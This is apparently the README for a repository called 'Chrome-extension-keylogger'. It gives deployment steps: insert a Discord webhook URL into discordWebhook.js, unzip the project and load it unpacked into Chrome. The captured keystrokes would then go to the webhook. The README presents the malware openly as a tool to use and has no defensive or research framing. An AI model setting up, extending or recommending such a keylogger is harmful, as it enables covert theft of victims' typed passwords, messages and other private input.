# Chrome-extension-keylogger

## Changes

On **line 1** in file **discordWebhook.js** change _"YOUR_DISCORD_WEBHOOK"_ with your discord webhook

Example for line 1:

`const discordWebhook = "https://discord.com/api/webhooks/12345678901234/dakdkaskdmkmlaslmclmkmxylcmlkymkcxmkcykclkxy"`

## How to use

1. Download zip from this repository

2. Extract zipped folder

3. Do the [changes](#changes)

4. Follow these steps with unzipped folder: <https://developer.chrome.com/docs/extensions/mv3/getstarted/development-basics/#load-unpacked>

## If you like it leave a ⭐
